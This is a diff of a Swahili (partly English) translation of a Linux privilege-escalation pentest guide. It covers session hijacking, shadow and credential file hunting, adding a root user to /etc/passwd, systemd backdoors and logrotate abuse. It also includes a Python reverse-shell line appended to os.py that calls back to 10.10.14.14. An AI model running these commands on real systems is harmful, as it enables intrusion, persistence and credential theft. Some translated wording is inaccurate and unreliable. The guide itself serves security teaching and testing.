-Hii ilikuwa tatizo na **toleo za zamani za tmux**. Sikufanikiwa kuteka kikao cha tmux (v2.1) kilichoundwa na root kama mtumiaji asiye na mamlaka.
+Hii ilikuwa shida na **matoleo ya zamani ya tmux**. Sikuweza kuingilia kikao cha tmux (v2.1) kilichoundwa na root kama mtumiaji asiye na mamlaka.
 
-**Orodhesha vikao vya tmux**
+**Orodha ya vikao vya tmux**
 ```bash
 tmux ls
 ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
@@ -1123,7 +1122,7 @@ tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session i
 ```
 ![](<../../.gitbook/assets/image (837).png>)
 
-**Ambatisha kwenye kikao**
+**Unganisha kwenye kikao**
 ```bash
 tmux attach -t myname #If you write something in this session it will appears in the other opened one
 tmux attach -d -t myname #First detach the session from the other console and then access it yourself
@@ -1133,53 +1132,53 @@ rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs c
 # If you are root or devs you can access it
 tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
 ```
-Angalia **Valentine box kutoka HTB** kama mfano.
+Check **Valentine box from HTB** for an example.
 
 ## SSH
 
 ### Debian OpenSSL Predictable PRNG - CVE-2008-0166
 
-Vipengele vyote vya SSL na SSH vilivyozalishwa kwenye mifumo inayotegemea Debian (Ubuntu, Kubuntu, nk) kati ya Septemba 2006 na Mei 13, 2008 vinaweza kuathiriwa na kosa hili.\
-Kosa hili husababishwa wakati wa kujenga ufunguo mpya wa ssh kwenye mifumo hiyo, kwani **ni mchanganyiko wa 32,768 pekee uliowezekana**. Hii inamaanisha kuwa uwezekano wote unaweza kuhesabiwa na **ukiwa na ufunguo wa umma wa ssh unaweza kutafuta ufunguo wa kibinafsi unaofanana**. Unaweza kupata uwezekano uliohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
+Mfunguo wote wa SSL na SSH ulioanzishwa kwenye mifumo ya msingi ya Debian (Ubuntu, Kubuntu, nk) kati ya Septemba 2006 na Mei 13, 2008 unaweza kuathiriwa na hitilafu hii.\
+Hitilafu hii inasababishwa wakati wa kuunda funguo mpya za ssh katika mifumo hiyo, kwani **mabadiliko 32,768 pekee yalikuwa yanawezekana**. Hii inamaanisha kwamba uwezekano wote unaweza kuhesabiwa na **ikiwa una funguo ya umma ya ssh unaweza kutafuta funguo ya kibinafsi inayolingana**. Unaweza kupata uwezekano uliohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
 
-### SSH Vipimo vya Usanidi Vinavyovutia
+### SSH Interesting configuration values
 
-* **PasswordAuthentication:** Inabainisha ikiwa uthibitisho wa nywila unaruhusiwa. Chaguo msingi ni `hapana`.
-* **PubkeyAuthentication:** Inabainisha ikiwa uthibitisho wa ufunguo wa umma unaruhusiwa. Chaguo msingi ni `ndiyo`.
-* **PermitEmptyPasswords**: Wakati uthibitisho wa nywila unaruhusiwa, inabainisha ikiwa server inaruhusu kuingia kwenye akaunti zenye herufi za nywila tupu. Chaguo msingi ni `hapana`.
+* **PasswordAuthentication:** Inaelezea ikiwa uthibitishaji wa nenosiri unaruhusiwa. Kiwango cha kawaida ni `no`.
+* **PubkeyAuthentication:** Inaelezea ikiwa uthibitishaji wa funguo za umma unaruhusiwa. Kiwango cha kawaida ni `yes`.
+* **PermitEmptyPasswords**: Wakati uthibitishaji wa nenosiri unaruhusiwa, inaelezea ikiwa seva inaruhusu kuingia kwenye akaunti zenye nywila tupu. Kiwango cha kawaida ni `no`.
 
 ### PermitRootLogin
 
-Inabainisha ikiwa root anaweza kuingia kwa kutumia ssh, chaguo msingi ni `hapana`. Inawezekana kuwa na thamani zifuatazo:
+Inaelezea ikiwa root anaweza kuingia kwa kutumia ssh, kiwango cha kawaida ni `no`. Thamani zinazowezekana:
 
-* `ndiyo`: root anaweza kuingia kwa kutumia nywila na ufunguo wa kibinafsi
-* `bila-nywila` au `zuia-nywila`: root anaweza kuingia tu kwa kutumia ufunguo wa kibinafsi
-* `amri-zilizolazimishwa-pekee`: Root anaweza kuingia tu kwa kutumia ufunguo wa kibinafsi na ikiwa chaguo la amri limetajwa
-* `hapana`: hapana
+* `yes`: root anaweza kuingia kwa kutumia nenosiri na funguo ya kibinafsi
+* `without-password` au `prohibit-password`: root anaweza kuingia tu kwa funguo ya kibinafsi
+* `forced-commands-only`: Root anaweza kuingia tu kwa kutumia funguo ya kibinafsi na ikiwa chaguo za amri zimeelezwa
+* `no` : hapana
 
 ### AuthorizedKeysFile
 
-Inabainisha faili zinazohifadhi ufunguo wa umma ambao unaweza kutumika kwa uthibitisho wa mtumiaji. Inaweza kuwa na alama kama `%h`, ambayo itabadilishwa na saraka ya nyumbani. **Unaweza kuonyesha njia kamili** (kuanzia `/`) au **njia za ndani kutoka kwa nyumbani kwa mtumiaji**. Kwa mfano:
+Inaelezea faili ambazo zinafunguo za umma ambazo zinaweza kutumika kwa uthibitishaji wa mtumiaji. Inaweza kuwa na alama kama `%h`, ambayo itabadilishwa na saraka ya nyumbani. **Unaweza kuashiria njia za moja kwa moja** (zinazoanzia `/`) au **njia za kulinganisha kutoka nyumbani kwa mtumiaji**. Kwa mfano:
 ```bash
 AuthorizedKeysFile    .ssh/authorized_keys access
 ```
-Hiyo mipangilio itaonyesha kwamba ukijaribu kuingia kwa **funguo ya kibinafsi** ya mtumiaji "**jina la jaribio**" ssh italinganisha funguo ya umma ya funguo lako na zile zilizoko katika `/home/jina la jaribio/.ssh/authorized_keys` na `/home/jina la jaribio/access`
+Ile usanidi huo utaonyesha kwamba ikiwa utajaribu kuingia na **funguo** ya mtumiaji "**testusername**" ssh italinganisha funguo ya umma ya funguo zako na zile zilizo katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`
 
 ### ForwardAgent/AllowAgentForwarding
 
-Kusonga mbele kwa wakala wa SSH inakuruhusu **kutumia funguo zako za SSH za ndani badala ya kuacha funguo** (bila nywila!) zikikaa kwenye server yako. Kwa hivyo, utaweza **kuruka** kupitia ssh **kwenda kwa mwenyeji** na kutoka hapo **kuruka kwenda kwa mwenyeji mwingine** **ukitumia** **funguo** iliyoko kwenye **mwenyeji wako wa awali**.
+SSH agent forwarding inakuwezesha **kutumia funguo zako za SSH za ndani badala ya kuacha funguo** (bila maneno ya siri!) zikiwa kwenye seva yako. Hivyo, utaweza **kuruka** kupitia ssh **kwenda mwenyeji** na kutoka hapo **kuruka kwa mwingine** mwenyeji **ukitumia** **funguo** iliyo katika **mwenyeji wako wa awali**.
 
-Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama hivi:
+Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama ifuatavyo:
 ```
 Host example.com
 ForwardAgent yes
 ```
-Tambua kwamba ikiwa `Host` ni `*` kila wakati mtumiaji anapohamia kwenye mashine tofauti, mwenyeji huyo ataweza kupata ufikiaji wa funguo (ambao ni suala la usalama).
+Kumbuka kwamba ikiwa `Host` ni `*` kila wakati mtumiaji anapohamia mashine tofauti, mwenyeji huyo atakuwa na uwezo wa kufikia funguo (ambayo ni tatizo la usalama).
 
-Faili `/etc/ssh_config` inaweza **kubadilisha** hii **chaguo** na kuruhusu au kukataa usanidi huu.\
-Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa neno la msimbo `AllowAgentForwarding` (chaguo la msingi ni kuruhusu).
+Faili `/etc/ssh_config` inaweza **kufuta** hizi **chaguzi** na kuruhusu au kukataa usanidi huu.\
+Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa neno muhimu `AllowAgentForwarding` (kawaida ni ruhusa).
 
-Ikiwa utagundua kuwa Forward Agent imeboreshwa katika mazingira, soma ukurasa ufuatao kwani **unaweza kutumia hii kwa kujipandisha hadhi**:
+Ikiwa unapata kwamba Forward Agent imewekwa katika mazingira, soma ukurasa ufuatao kama **unaweza kuweza kuitumia vibaya ili kupandisha mamlaka**:
 
 {% content-ref url="ssh-forward-agent-exploitation.md" %}
 [ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
@@ -1189,24 +1188,26 @@ Ikiwa utagundua kuwa Forward Agent imeboreshwa katika mazingira, soma ukurasa uf
 
 ### Faili za Profaili
 
-Faili `/etc/profile` na faili chini ya `/etc/profile.d/` ni **hati ambazo hutekelezwa wakati mtumiaji anapoendesha kabia mpya**. Kwa hivyo, ikiwa unaweza **kuandika au kuhariri yoyote kati yao unaweza kujipandisha hadhi**.
+Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **script ambazo zinafanywa wakati mtumiaji anapokimbia shell mpya**. Hivyo, ikiwa unaweza **kuandika au kubadilisha yoyote kati yao unaweza kupandisha mamlaka**.
 ```bash
 ls -l /etc/profile /etc/profile.d/
 ```
+Ikiwa kuna skripti za wasifu zisizo za kawaida, unapaswa kuzikagua kwa **maelezo nyeti**.
+
 ### Faili za Passwd/Shadow
 
-Kulingana na OS faili za `/etc/passwd` na `/etc/shadow` zinaweza kutumia jina tofauti au kunaweza kuwa na nakala rudufu. Kwa hivyo inashauriwa **kuzipata zote** na **kuangalia kama unaweza kuzisoma** ili uone **kama kuna hashes** ndani ya faili hizo:
+Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kuwa na jina tofauti au kuna nakala ya akiba. Kwa hivyo inashauriwa **kupata zote** na **kuangalia kama unaweza kusoma** ili kuona **kama kuna hash** ndani ya faili hizo:
 ```bash
 #Passwd equivalent files
 cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 #Shadow equivalent files
 cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
 ```
-Katika baadhi ya matukio unaweza kupata **hash za nywila** ndani ya faili ya `/etc/passwd` (au sawa)
+Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au sawa na hiyo)
 ```bash
 grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 ```
-### Inaandikika /etc/passwd
+### Writable /etc/passwd
 
 Kwanza, tengeneza nenosiri kwa kutumia moja ya amri zifuatazo.
 ```
@@ -1214,40 +1215,42 @@ openssl passwd -1 -salt hacker hacker
 mkpasswd -m SHA-512 hacker
 python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
 ```
-Kisha ongeza mtumiaji `hacker` na ongeza nywila iliyozalishwa.
+Kisha ongeza mtumiaji `hacker` na ongeza nenosiri lililotengenezwa.
 ```
 hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
 ```
-Kwa mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
+E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
 
 Sasa unaweza kutumia amri ya `su` na `hacker:hacker`
 
-Kwa hiari, unaweza kutumia mistari ifuatayo kuongeza mtumiaji bandia bila nenosiri.\
-ONYO: unaweza kudhoofisha usalama wa sasa wa mashine.
+Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa dummy bila nenosiri.\
+WARNING: unaweza kudhoofisha usalama wa sasa wa mashine.
 ```
 echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
 su - dummy
 ```
-NOTE: Katika majukwaa ya BSD `/etc/passwd` iko katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imepewa jina la `/etc/spwd.db`.
+NOTE: Katika majukwaa ya BSD, `/etc/passwd` iko kwenye `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imepewa jina jipya kuwa `/etc/spwd.db`.
 
-Unapaswa kuangalia ikiwa unaweza **kuandika kwenye faili nyeti**. Kwa mfano, je, unaweza kuandika kwenye **faili ya mazingira ya huduma**?
+Unapaswa kuangalia kama unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, je, unaweza kuandika kwenye **faili ya usanidi wa huduma**?
 ```bash
 find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
 for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
 ```
-Kwa mfano, ikiwa mashine inaendesha **seva ya tomcat** na unaweza **kurekebisha faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/**, basi unaweza kurekebisha mistari:
+Kwa mfano, ikiwa mashine inafanya kazi na **tomcat** server na unaweza **kubadilisha faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kubadilisha mistari:
 ```
 ExecStart=/path/to/backdoor
 User=root
 Group=root
 ```
-### Angalia Vichupo
+Your backdoor will be executed the next time that tomcat is started.
 
-Vichupo vifuatavyo vinaweza kuwa na nakala rudufu au habari za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Labda huenda usiweze kusoma la mwisho lakini jaribu)
+### Check Folders
+
+The following folders may contain backups or interesting information: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Labda huwezi kusoma ya mwisho lakini jaribu)
 ```bash
 ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
 ```
-### Mahali/ Faili Zilizomilikiwa za Kigeni
+### Mahali ya Ajabu/Faida za Faili
 ```bash
 #root owned files in /home folders
 find /home -user root 2>/dev/null
@@ -1268,11 +1271,11 @@ done
 ```bash
 find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
 ```
-### Faili za DB za Sqlite
+### Faili za Sqlite DB
 ```bash
 find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
 ```
-### \*\_historia, .sudo_as_admin_mafanikio, wasifu, bashrc, httpd.conf, .mpango, .htpasswd, .git-uthibitishaji, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml faili
+### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
 ```bash
 find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
 ```
@@ -1280,14 +1283,12 @@ find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -nam
 ```bash
 find / -type f -iname ".*" -ls 2>/dev/null
 ```
-### **Script/Binaries in PATH**
-
-### **Script/Vidakuzi katika NJIA**
+### **Script/Binaries katika PATH**
 ```bash
 for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
 for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
 ```
-### **Faili za Wavuti**
+### **Faili za wavuti**
 ```bash
 ls -alhR /var/www/ 2>/dev/null
 ls -alhR /srv/www/htdocs/ 2>/dev/null
@@ -1298,20 +1299,20 @@ ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 ```bash
 find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
 ```
-### Faili zinazojulikana zina nywila
+### Known files containing passwords
 
-Soma nambari ya [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazoweza kuwa na nywila**.\
-**Zana nyingine ya kuvutia** unayoweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambayo ni programu huru inayotumiwa kufufua nywila nyingi zilizohifadhiwa kwenye kompyuta ya eneo kwa Windows, Linux & Mac.
+Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazoweza kuwa na nywila**.\
+**Chombo kingine cha kuvutia** ambacho unaweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambacho ni programu ya chanzo wazi inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.
 
-### Kumbukumbu
+### Logs
 
-Ikiwa unaweza kusoma kumbukumbu, unaweza kupata **habari za kuvutia/siri ndani yake**. Kumbukumbu inavyokuwa ya ajabu, ndivyo itakavyokuwa ya kuvutia zaidi (labda).\
-Pia, baadhi ya kumbukumbu za ukaguzi zilizo **mbaya** (zilizowekewa mlango wa nyuma?) zinaweza kukuruhusu **kurekodi nywila** ndani ya kumbukumbu za ukaguzi kama ilivyoelezwa katika chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
+Ikiwa unaweza kusoma logi, huenda ukapata **habari za kuvutia/za siri ndani yao**. Kadri logi inavyokuwa ya ajabu, ndivyo itakavyokuwa ya kuvutia zaidi (labda).\
+Pia, baadhi ya "**mbaya**" zilizowekwa (zilizokuwa na backdoor?) **audit logs** zinaweza kukuruhusu **kurekodi nywila** ndani ya audit logs kama ilivyoelezwa katika chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
 ```bash
 aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
 grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
 ```
-Ili **kusoma logs ya kikundi** [**adm**](makundi-ya-kuvutia-linux-pe/#kikundi-cha-adm) itakuwa ya manufaa sana.
+Ili **kusoma kumbukumbu za kundi** [**adm**](interesting-groups-linux-pe/#adm-group) itakuwa ya msaada mkubwa.
 
 ### Faili za Shell
 ```bash
@@ -1324,44 +1325,44 @@ Ili **kusoma logs ya kikundi** [**adm**](makundi-ya-kuvutia-linux-pe/#kikundi-ch
 ~/.zlogin #zsh shell
 ~/.zshrc #zsh shell
 ```
-### Utafutaji wa Vipeperushi/Vipeperushi vya Kigeni
+### Generic Creds Search/Regex
 
-Pia unapaswa kuangalia faili zinazo **kuwa na neno** "**password**" katika **jina** yake au ndani ya **maudhui**, na pia angalia IPs na barua pepe ndani ya magogo, au hash regexps.\
-Sitataja hapa jinsi ya kufanya hivi vyote lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.
+Unapaswa pia kuangalia faili zinazo na neno "**password**" katika **jina** lake au ndani ya **maudhui**, na pia kuangalia IPs na barua pepe ndani ya logi, au hashes regexps.\
+Sitaorodhesha hapa jinsi ya kufanya yote haya lakini ikiwa unavutiwa unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) unafanya.
 
-## Faili Zinazoweza Kuandikwa
+## Writable files
 
-### Utekaji wa Maktaba ya Python
+### Python library hijacking
 
-Ikiwa unajua **mahali** ambapo skripti ya python itatekelezwa na unaweza **kuandika ndani** ya folda hiyo au unaweza **kurekebisha maktaba za python**, unaweza kurekebisha maktaba ya OS na kuifanya kuwa na mlango wa nyuma (ikiwa unaweza kuandika mahali ambapo skripti ya python itatekelezwa, nakili na ubandike maktaba ya os.py).
+Ikiwa unajua **kutoka wapi** script ya python itatekelezwa na unaweza **kuandika ndani** ya folda hiyo au unaweza **kubadilisha maktaba za python**, unaweza kubadilisha maktaba ya OS na kuingiza nyuma (ikiwa unaweza kuandika mahali ambapo script ya python itatekelezwa, nakili na ubandike maktaba ya os.py).
 
-Ku **kuweka mlango wa nyuma kwenye maktaba**, weka mwishoni mwa maktaba ya os.py mstari ufuatao (badilisha IP na PORT):
+Ili **kuingiza nyuma maktaba** ongeza tu kwenye mwisho wa maktaba ya os.py mistari ifuatayo (badilisha IP na PORT):
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
-### Uchunguzi wa Logrotate
+### Logrotate exploitation
 
-Udhaifu katika `logrotate` huruhusu watumiaji wenye **ruhusa za kuandika** kwenye faili ya log au folda zake za mzazi kupata mamlaka ya juu. Hii ni kwa sababu `logrotate`, mara nyingi ikifanya kazi kama **root**, inaweza kudanganywa kutekeleza faili za kiholela, hasa katika folda kama _**/etc/bash\_completion.d/**_. Ni muhimu kuchunguza ruhusa si tu katika _/var/log_ bali pia katika folda yoyote ambapo mzunguko wa logi unatumika.
+Uthibitisho katika `logrotate` unaruhusu watumiaji wenye **idhini za kuandika** kwenye faili la log au saraka zake za mzazi kupata haki za juu. Hii ni kwa sababu `logrotate`, mara nyingi ikikimbia kama **root**, inaweza kudhibitiwa ili kutekeleza faili zisizo za kawaida, hasa katika saraka kama _**/etc/bash\_completion.d/**_. Ni muhimu kuangalia idhini si tu katika _/var/log_ bali pia katika saraka yoyote ambapo mzunguko wa log unatumika.
 
 {% hint style="info" %}
-Udhaifu huu unaathiri `logrotate` toleo `3.18.0` na vinyume vyake
+Uthibitisho huu unahusisha toleo la `logrotate` `3.18.0` na la zamani
 {% endhint %}
 
-Maelezo zaidi kuhusu udhaifu huu yanaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).
+Taarifa zaidi kuhusu uthibitisho huu inaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).
 
-Unaweza kutumia udhaifu huu na [**logrotten**](https://github.com/whotwagner/logrotten).
+Unaweza kutumia uthibitisho huu na [**logrotten**](https://github.com/whotwagner/logrotten).
 
-Udhaifu huu ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(magogo ya nginx),** kwa hivyo unapogundua unaweza kubadilisha magogo, chunguza ni nani anayesimamia magogo hayo na angalia ikiwa unaweza kupandisha mamlaka kwa kubadilisha magogo kwa viungo vya alama.
+Uthibitisho huu ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** hivyo kila wakati unapata kuwa unaweza kubadilisha logs, angalia nani anasimamia hizo logs na angalia kama unaweza kupandisha haki kwa kubadilisha logs na symlinks.
 
 ### /etc/sysconfig/network-scripts/ (Centos/Redhat)
 
-**Kumbukumbu ya Udhaifu:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
+**Marejeleo ya uthibitisho:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
 
-Ikiwa, kwa sababu yoyote, mtumiaji anaweza **kuandika** skrini ya `ifcf-<chochote>` kwa _/etc/sysconfig/network-scripts_ **au** anaweza **kurekebisha** ile iliyopo, basi **mfumo wako umeshambuliwa**.
+Ikiwa, kwa sababu yoyote, mtumiaji anaweza **kuandika** script ya `ifcf-<chochote>` kwenye _/etc/sysconfig/network-scripts_ **au** inaweza **kurekebisha** moja iliyopo, basi **sistimu yako imepata hatari**.
 
-Skrini za mtandao, _ifcg-eth0_ kwa mfano hutumiwa kwa ajili ya uhusiano wa mtandao. Zinaonekana kama faili za .INI. Walakini, zinasakinishwa kiotomatiki kwenye Linux na Meneja wa Mtandao (dispatcher.d).
+Scripts za mtandao, _ifcg-eth0_ kwa mfano zinatumika kwa muunganisho wa mtandao. Zinatazama kama faili za .INI. Hata hivyo, zinachukuliwa \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).
 
-Kwa mfano wangu, sifa ya `NAME=` katika skrini hizi za mtandao haishughulikiwi kwa usahihi. Ikiwa una **nafasi nyeupe/blank katika jina mfumo unajaribu kutekeleza sehemu baada ya nafasi nyeupe/blank**. Hii inamaanisha kwamba **kila kitu baada ya nafasi nyeupe ya kwanza kinatekelezwa kama root**.
+Katika kesi yangu, `NAME=` inayotolewa katika hizi scripts za mtandao haishughulikiwi vizuri. Ikiwa una **nafasi nyeupe/boreshaji katika jina, mfumo unajaribu kutekeleza sehemu baada ya nafasi nyeupe/boreshaji**. Hii ina maana kwamba **kila kitu baada ya nafasi ya kwanza ya boreshaji kinatekelezwa kama root**.
 
 Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
 ```bash
@@ -1371,21 +1372,21 @@ DEVICE=eth0
 ```
 ### **init, init.d, systemd, na rc.d**
 
-Directory `/etc/init.d` ni nyumbani kwa **maandishi** ya System V init (SysVinit), **mfumo wa usimamizi wa huduma wa Linux wa kisasa**. Inajumuisha maandishi ya `kuanza`, `kukomesha`, `kuanzisha tena`, na mara nyingine `kupakia upya` huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia viungo vya alama za ishara zilizopatikana katika `/etc/rc?.d/`. Njia mbadala katika mifumo ya Redhat ni `/etc/rc.d/init.d`.
+Direktori `/etc/init.d` ni nyumbani kwa **scripts** za System V init (SysVinit), **mfumo wa usimamizi wa huduma za Linux wa jadi**. Inajumuisha scripts za `kuanzisha`, `kusitisha`, `kuanzisha tena`, na wakati mwingine `kurekebisha` huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia viungo vya alama vinavyopatikana katika `/etc/rc?.d/`. Njia mbadala katika mifumo ya Redhat ni `/etc/rc.d/init.d`.
 
-Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya zaidi wa **usimamizi wa huduma** ulioanzishwa na Ubuntu, ukitumia faili za usanidi kwa kazi za usimamizi wa huduma. Licha ya mpito kwenda Upstart, maandishi ya SysVinit bado hutumiwa pamoja na miundo ya Upstart kutokana na safu ya utangamano katika Upstart.
+Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, **usimamizi wa huduma** wa kisasa ulioanzishwa na Ubuntu, ukitumia faili za usanidi kwa kazi za usimamizi wa huduma. Licha ya mpito kwenda Upstart, scripts za SysVinit bado zinatumika pamoja na usanidi wa Upstart kutokana na safu ya ulinganifu katika Upstart.
 
-**systemd** inatokea kama meneja wa kuanzisha na huduma wa kisasa, ukitoa vipengele vya juu kama vile kuanza kwa daemon kwa ombi, usimamizi wa automount, na picha za hali ya mfumo. Inapanga faili katika `/usr/lib/systemd/` kwa pakiti za usambazaji na `/etc/systemd/system/` kwa marekebisho ya msimamizi, ikipunguza mchakato wa usimamizi wa mfumo.
+**systemd** inajitokeza kama msimamizi wa kisasa wa kuanzisha na huduma, ikitoa vipengele vya juu kama vile kuanzisha daemon kwa mahitaji, usimamizi wa automount, na picha za hali ya mfumo. Inapanga faili katika `/usr/lib/systemd/` kwa ajili ya pakiti za usambazaji na `/etc/systemd/system/` kwa ajili ya marekebisho ya msimamizi, ikirahisisha mchakato wa usimamizi wa mfumo.
 
-## Mbinu Nyingine
+## Njia Nyingine
 
-### Kupandisha Hadhi ya Mamlaka ya NFS
+### NFS Privilege escalation
 
 {% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
-[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
+[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no_root_squash-misconfiguration-pe.md)
 {% endcontent-ref %}
 
-### Kutoroka kutoka kwa Mabaa Yaliyozuiwa
+### Kutoroka kutoka kwa Shells zilizozuiliwa
 
 {% content-ref url="escaping-from-limited-bash.md" %}
 [escaping-from-limited-bash.md](escaping-from-limited-bash.md)
@@ -1397,31 +1398,31 @@ Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya zaidi wa
 [cisco-vmanage.md](cisco-vmanage.md)
 {% endcontent-ref %}
 
-## Kinga za Usalama wa Kernel
+## Ulinzi wa Usalama wa Kernel
 
 * [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
 * [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)
 
 ## Msaada Zaidi
 
-[Static impacket binaries](https://github.com/ropnop/impacket\_static\_binaries)
+[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)
 
-## Zana za Kupandisha Hadhi za Linux/Unix
+## Zana za Linux/Unix Privesc
 
-### **Zana bora ya kutafuta vectors za kupandisha hadhi za mamlaka za ndani za Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
